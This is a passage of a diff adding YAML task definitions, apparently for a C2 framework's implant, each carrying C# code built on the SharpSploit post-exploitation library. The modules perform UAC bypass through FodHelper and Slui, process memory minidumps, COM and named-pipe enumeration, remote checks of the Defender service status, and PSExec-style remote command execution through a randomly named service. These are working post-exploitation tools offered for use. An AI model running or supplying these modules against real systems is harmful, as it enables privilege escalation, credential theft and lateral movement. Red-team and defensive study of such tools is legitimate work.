+    - Name: System.Core.dll
+      Location: net40/System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40/System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net35/System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net35/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35/System.Core.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35/mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.ServiceProcess.dll
+      Location: net35/System.ServiceProcess.dll
+      DotNetVersion: Net35
+    - Name: System.XML.dll
+      Location: net35/System.XML.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35/System.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35/System.IdentityModel.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net35/System.Windows.Forms.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35/System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net35/System.Management.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net40/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net40/System.Management.Automation.dll
+      DotNetVersion: Net40
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+- Name: BypassUAC-FodHelper
+  Aliases: []
+  Author:
+    Name: ''
+    Handle: ''
+    Link: ''
+  Description: Bypasses UAC through token duplication and executes a command with high integrity.
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: >-
+    using System;
+
+    using System.Text;
+
+    using SharpSploit.Credentials;
+
+
+    public static class Task
+
+    {
+        public static string Execute(string encodedCommand)
+        {
+            try
+            {
+                using (Tokens t = new Tokens())
+                {
+                    if (t.BypassUACFodHelper(encodedCommand))
+                    {
+                        return "Successfully executed command with high integrity.";
+                    }
+                    else
+                    {
+                        return "Failed to execute with high integrity.";
+                    }
+                }
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: Command
+    Value: ''
+    DefaultValue: ''
+    Description: Bypasses UAC through FodHelper and executes a command with high integrity. (command needs to be base64 encoded
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit/SharpSploit/
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.XML.dll
+      Location: net40/System.XML.dll
+      DotNetVersion: Net40
+    - Name: System.ServiceProcess.dll
+      Location: net40/System.ServiceProcess.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40/mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40/System.dll
+      DotNetVersion: Net40
+    - Name: System.Windows.Forms.dll
+      Location: net40/System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40/System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.Management.dll
+      Location: net40/System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40/System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40/System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net35/System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net35/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35/System.Core.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35/mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.ServiceProcess.dll
+      Location: net35/System.ServiceProcess.dll
+      DotNetVersion: Net35
+    - Name: System.XML.dll
+      Location: net35/System.XML.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35/System.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35/System.IdentityModel.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net35/System.Windows.Forms.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35/System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net35/System.Management.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net40/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net40/System.Management.Automation.dll
+      DotNetVersion: Net40
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+- Name: BypassUAC-Slui
+  Aliases: []
+  Author:
+    Name: ''
+    Handle: ''
+    Link: ''
+  Description: Bypasses UAC through SLUI.
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: >-
+    using System;
+
+    using System.Text;
+
+    using SharpSploit.Credentials;
+
+
+    public static class Task
+
+    {
+        public static string Execute(string encodedCommand)
+        {
+            try
+            {
+                using (Tokens t = new Tokens())
+                {
+                    if (t.BypassUACSlui(encodedCommand))
+                    {
+                        return "Successfully executed command with high integrity.";
+                    }
+                    else
+                    {
+                        return "Failed to execute with high integrity.";
+                    }
+                }
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: Command
+    Value: ''
+    DefaultValue: ''
+    Description: Bypasses UAC through FodHelper and executes a command with high integrity. (command needs to be base64 encoded
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit/SharpSploit/
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.XML.dll
+      Location: net40/System.XML.dll
+      DotNetVersion: Net40
+    - Name: System.ServiceProcess.dll
+      Location: net40/System.ServiceProcess.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40/mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40/System.dll
+      DotNetVersion: Net40
+    - Name: System.Windows.Forms.dll
+      Location: net40/System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40/System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.Management.dll
+      Location: net40/System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40/System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40/System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net35/System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net35/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35/System.Core.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35/mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.ServiceProcess.dll
+      Location: net35/System.ServiceProcess.dll
+      DotNetVersion: Net35
+    - Name: System.XML.dll
+      Location: net35/System.XML.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35/System.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35/System.IdentityModel.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net35/System.Windows.Forms.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35/System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net35/System.Management.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net40/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net40/System.Management.Automation.dll
+      DotNetVersion: Net40
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+- Author:
+    Name: Simone Salucci & Daniel López @ NCC Group
+    Handle: '@saim1z @attl4s'
+    Link: ''
+  Name: CreateProcessMinidump
+  Aliases:
+  - minidump
+  Description: Generates a minidump that represents the memory of a running process. Uses the MiniDumpWriteDump Win32 API call through PInvoke
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: >
+    using System;
+
+    using System.IO;
+
+    using System.Linq;
+
+
+    using SharpSploit.Enumeration;
+
+
+    public static class Task
+
+    {
+        public static string Execute(string Process, string OutputPath, string OutputFileName)
+        {
+            try
+            {
+                if (!Directory.Exists(OutputPath))
+                {
+                    return $"Directory: {OutputPath} does not exist.";
+                }
+                if (int.TryParse(Process, out int ProcID))
+                {
+                    if (Host.CreateProcessDump(ProcID, OutputPath, OutputFileName))
+                    {
+                        return $"Created minidump of process with PID: {ProcID} located at: {Path.Combine(OutputPath, OutputFileName)}";
+                    }
+                    return $"Failed to create minidump of process with PID: {ProcID}. {Path.Combine(OutputPath, OutputFileName)} has been deleted.";
+                }
+                if (Host.CreateProcessDump(Process, OutputPath, OutputFileName))
+                {
+                    return $"Created minidump of process: {Process} located at: {Path.Combine(OutputPath, OutputFileName)}";
+                }
+                return $"Failed to create minidump of process: {Process}. {Path.Combine(OutputPath, OutputFileName)} has been deleted.";
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+        }
+    }
+  Compiled: false
+  TaskingType: Assembly
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit/SharpSploit/
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.dll
+      Location: net35/System.dll
+      DotNetVersion: Net35
+    - Name: System.ServiceProcess.dll
+      Location: net40/System.ServiceProcess.dll
+      DotNetVersion: Net40
+    - Name: System.ServiceProcess.dll
+      Location: net35/System.ServiceProcess.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net40/System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.Windows.Forms.dll
+      Location: net35/System.Windows.Forms.dll
+      DotNetVersion: Net35
+    - Name: System.Management.Automation.dll
+      Location: net40/System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net35/System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net40/System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.Management.dll
+      Location: net35/System.Management.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net40/System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net35/System.IdentityModel.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net40/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net35/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net40/System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net35/System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net40/System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net35/System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net40/System.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net35/mscorlib.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net40/mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net35/System.XML.dll
+      DotNetVersion: Net35
+    - Name: System.XML.dll
+      Location: net40/System.XML.dll
+      DotNetVersion: Net40
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: Process
+    Value: ''
+    DefaultValue: ''
+    Description: Process name or PID
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+    GruntTaskId: 63
+  - Name: OutputPath
+    Value: ''
+    DefaultValue: C:\windows\temp\
+    Description: Path where the dump will be stored (e.g. C:\windows\temp\)
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+    GruntTaskId: 63
+  - Name: OutputFileName
+    Value: ''
+    DefaultValue: dump.bin
+    Description: Name used for the dump (e.g. dump.bin)
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+    GruntTaskId: 63
+- Name: GetCOMKeys
+  Aliases: []
+  Author:
+    Name: Victor Flores
+    Handle: ''
+    Link: ''
+  Description: Returns x amount of COM keys and its members functions/properties (x defaults to 10)
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: "\nusing System;\nusing System.ServiceProcess;\nusing System.IO;\nusing System.Reflection;\nusing System.Management.Automation;\nusing System.Collections.Generic;\nusing System.Collections.ObjectModel;\nusing Microsoft.Win32;\n\nusing SharpSploit.Execution;\n\n\n\npublic static class Task\n{\n		public static string InspectCOMMembers(Type type)\n        {\n            Int32 tabs = 25;\n            string members = \"\";\n\n            foreach (MemberInfo mi in type.GetMembers())\n            {\n                \n                string Name = mi.Name;\n                string membertype = \"\";\n                string parameters = \"\";\n                string returntiype = \"\";\n               \n                if (mi.MemberType == MemberTypes.Method)\n                {\n                    membertype = \"Method\";\n\n                    foreach (ParameterInfo pi in ((MethodInfo)mi).GetParameters())\n                    {\n                        parameters=String.Format(\"{0} {1} ({2} {3});\", ((MethodInfo)mi).ReturnType.ToString(), Name, pi.ParameterType, pi.Name);\n                        \n                    }\n                    if (parameters == \"\")\n                    {\n                        parameters = String.Format(\"{0} {1} ();\", ((MethodInfo)mi).ReturnType.ToString(), Name);\n                    }\n                }\n\n                if (mi.MemberType == MemberTypes.Property)\n                {\n                    membertype = \"Property\";\n                    foreach (MethodInfo am in ((PropertyInfo)mi).GetAccessors())\n                    {\n                        parameters = String.Format(\"{0}\", am);\n                    }\n                }\n                string member = String.Format(\"{0}{1}{2}{3}{4}{5}\", Name,\n                    new String(' ', tabs - Name.Length),\n                    membertype, new String(' ', (tabs - membertype.Length) / 2),\n                    parameters, Environment.NewLine);\n\n                members = members + member;\n            }\n            return members;\n        }\n        static string GetKeys(string path, string amount = \"10\")\n        {\n        	Int32 _amount = Int32.Parse(amount);\n            RegistryKey rkey = Registry.ClassesRoot.OpenSubKey(path);\n            // Retrieve all the subkeys for the specified key.\n            String[] names = rkey.GetSubKeyNames();\n\n            int icount = 0;\n\n            Console.WriteLine(\"Subkeys of \" + rkey.Name);\n            Console.WriteLine(\"-----------------------------------------------\");\n            String output = \"\";\n         \n            foreach (String s in names)\n            {\n                Int32 i = 0;\n                if (icount == 0)\n                {\n                    icount++;\n                    continue;\n                }\n\n                try\n                {\n                 \n                    var type = System.Type.GetTypeFromCLSID(new Guid(s.Trim()));\n                    object item = System.Activator.CreateInstance(type);\n                    output += String.Format(\"\\t{0}\" + Environment.NewLine + \"\\tType: {1}{2}\", s, type.Name, Environment.NewLine);                 \n                    output = output + String.Format(\"Name\\t\\t\\tMemberType\\t\\tDefinition\" \n                        + Environment.NewLine \n                        + new string('-', 60) \n                        + Environment.NewLine);\n                \n                    output = output + InspectCOMMembers(item.GetType());\n                    output = output +  Environment.NewLine;\n\n                }\n                catch (Exception e)\n                {\n                    continue;\n                }\n\n                if (icount >= _amount)\n                    break;\n                icount++;\n            }\n            return output;\n        }\n\n    public static string Execute(string path, string amount)\n    {\n        try\n        {\n            return GetKeys(path, amount);\n        }\n        catch (Exception e) { return e.GetType().FullName + \": \" + e.Message + Environment.NewLine + e.StackTrace; }\n    }\n}"
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: path
+    Value: ''
+    DefaultValue: ''
+    Description: ''
+    SuggestedValues:
+    - CLSID
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: amount
+    Value: ''
+    DefaultValue: 10
+    Description: ''
+    SuggestedValues:
+    - 10
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit/SharpSploit/
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.Windows.Forms.dll
+      Location: net35/System.Windows.Forms.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net40/System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.ServiceProcess.dll
+      Location: net40/System.ServiceProcess.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net40/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40/System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40/System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.Windows.Forms.dll
+      Location: net40/System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40/System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40/mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40/System.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net35/System.XML.dll
+      DotNetVersion: Net35
+    - Name: System.Management.Automation.dll
+      Location: net35/System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35/System.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35/System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35/System.IdentityModel.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net35/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net35
+    - Name: System.ServiceProcess.dll
+      Location: net35/System.ServiceProcess.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net35/System.Management.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35/System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35/mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Management.Automation.dll
+      Location: net40/System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net40/System.XML.dll
+      DotNetVersion: Net40
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+- Name: GetNamedPipes
+  Aliases: []
+  Author:
+    Name: Victor Flores
+    Handle: ''
+    Link: ''
+  Description: Return all the named pipes
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: >-
+    using System;
+
+    using System.IO;
+
+
+    public static class Task
+
+    {
+        public static string Execute()
+        {
+            try
+            {
+                string pipes = "";
+                string[] pipes_arr = Directory.GetFiles("\\\\.\\\\pipe\\\\");
+                Array.Sort(pipes_arr, StringComparer.InvariantCulture);
+                foreach (string f in pipes_arr)
+                {
+                    string[] pipe = f.Split('\\');
+                    pipes = pipes + pipe[pipe.Length-1] + Environment.NewLine;
+                }
+                return pipes;
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options: []
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit/SharpSploit/
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.Windows.Forms.dll
+      Location: net35/System.Windows.Forms.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net40/System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.ServiceProcess.dll
+      Location: net40/System.ServiceProcess.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net40/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40/System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40/System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.Windows.Forms.dll
+      Location: net40/System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40/System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40/mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40/System.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net35/System.XML.dll
+      DotNetVersion: Net35
+    - Name: System.Management.Automation.dll
+      Location: net35/System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35/System.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35/System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35/System.IdentityModel.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net35/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net35
+    - Name: System.ServiceProcess.dll
+      Location: net35/System.ServiceProcess.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net35/System.Management.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35/System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35/mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Management.Automation.dll
+      Location: net40/System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net40/System.XML.dll
+      DotNetVersion: Net40
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+- Name: GetServiceStatus
+  Aliases: []
+  Author:
+    Name: Victor Flores
+    Handle: ''
+    Link: ''
+  Description: Return the status of a service in a foreign system
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: >-
+    using System;
+
+    using System.IO;
+
+    using System.Linq;
+
+    using System.Text;
+
+    using System.Security;
+
+    using System.Security.Principal;
+
+    using System.Collections.Generic;
+
+    using SharpSploit.Credentials;
+
+    using SharpSploit.Enumeration;
+
+    using SharpSploit.Execution;
+
+    using SharpSploit.Generic;
+
+    using SharpSploit.Misc;
+
+    using SharpSploit.LateralMovement;
+
+
+    public static class Task
+
+    {
+        public static string Execute(string RemoteHost, String Service)
+        {
+        	var defender = SCM.GetService(RemoteHost, Service);
+            return defender.Status.ToString();
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: RemoteHost
+    Value: ''
+    DefaultValue: ''
+    Description: remote system to check
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Service
+    Value: ''
+    DefaultValue: ''
+    Description: Service to perform the check agains
+    SuggestedValues:
+    - WinDefend
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit/SharpSploit/
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.Windows.Forms.dll
+      Location: net35/System.Windows.Forms.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net40/System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.ServiceProcess.dll
+      Location: net40/System.ServiceProcess.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net40/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40/System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40/System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.Windows.Forms.dll
+      Location: net40/System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40/System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40/mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40/System.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net35/System.XML.dll
+      DotNetVersion: Net35
+    - Name: System.Management.Automation.dll
+      Location: net35/System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35/System.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35/System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35/System.IdentityModel.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net35/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net35
+    - Name: System.ServiceProcess.dll
+      Location: net35/System.ServiceProcess.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net35/System.Management.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35/System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35/mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Management.Automation.dll
+      Location: net40/System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net40/System.XML.dll
+      DotNetVersion: Net40
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+- Name: PSExecCommand
+  Aliases: []
+  Author:
+    Name: Daniel Duggan
+    Handle: _RastaMouse
+    Link: https://twitter.com/_RastaMouse
+  Description: Execute a command on a remote system using Service Control Manager - SCM
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: >
+    using System;
+
+    using System.IO;
+
+    using System.Linq;
+
+
+    using SharpSploit.LateralMovement;
+
+
+    public static class Task
+
+    {
+        public static string Execute(string ComputerName, string Command)
+        {
+            string randName = GenerateRandomString(8);
+
+            try
+            {
+                if (!SCM.CreateService(ComputerName, randName, "", Command))
+                {
+                    return "[x] Failed to create service";
+                }
+                if (!SCM.StartService(ComputerName, randName))
+                {
+                    SCM.DeleteService(ComputerName, randName);
+                    return $@"[+] Service {randName} created ({Command})";
+                }
+                if (!SCM.DeleteService(ComputerName, randName))
+                {
+                    return "[x] Failed to delete service";
+                }
+
+                return $@"[+] Service {randName} created ({Command})";
+            }
+            catch (Exception e)
+            {
+                if (e.Message.Contains("Cannot start service"))
+                {
+                	  SCM.DeleteService(ComputerName, randName);
+                    return $@"[+] Service {randName} created ({Command})";
+                }
+                else
+                {
+                    return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace;
+                }
+            }
+        }
+
+        private static string GenerateRandomString(int length)
+        {
+            Random random = new Random();
+            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            return new string(Enumerable.Repeat(chars, length)
+                .Select(s => s[random.Next(s.Length)]).ToArray());
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: ComputerName
+    Value: ''
+    DefaultValue: ''
+    Description: ComputerName to launch the command on.
+    SuggestedValues:
+    - localhost
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Command
+    Value: ''
+    DefaultValue: ''
+    Description: Command to execute on the remote system.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit/SharpSploit/
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.DirectoryServices.dll
+      Location: net35/System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.ServiceProcess.dll
+      Location: net40/System.ServiceProcess.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net40/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net40/System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40/System.dll
+      DotNetVersion: Net40
+    - Name: System.Windows.Forms.dll
+      Location: net40/System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.Management.dll
